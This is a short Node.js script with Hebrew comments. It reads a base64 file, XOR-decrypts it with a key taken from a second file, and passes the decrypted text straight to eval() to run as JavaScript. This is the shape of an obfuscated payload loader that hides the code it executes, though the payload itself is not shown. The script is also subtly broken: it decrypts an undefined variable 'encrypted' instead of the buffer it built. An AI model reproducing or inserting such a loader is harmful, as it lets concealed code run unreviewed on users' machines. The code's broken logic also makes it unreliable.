const fs = require('fs');

// הפונקציה לפענוח XOR
function xorDecrypt(data, key) {
  const keyBytes = Buffer.from(key);
  const out = Buffer.alloc(data.length);

  for (let i = 0; i < data.length; i++) {
    out[i] = data[i] ^ keyBytes[i % keyBytes.length];
  }
  return out;
}

// קריאת הקובץ המוצפן
const encryptedBase64 = fs.readFileSync("encrypted.bin" ,"utf8");
// המרה מבית 64 לבאפא
const encryptedBuffer = Buffer.from(encryptedBase64 ,"base64");
//המפתח להצפנהן!)
const key = fs.readFileSync("cood.txt","utf8").trim();

// פענוח
const decrypted = xorDecrypt(encrypted, key);

// הפיכת הפלט לטקסט (קוד JS) והרצה מיידית
const jsCode = decrypted.toString("utf8");
eval(jsCode);
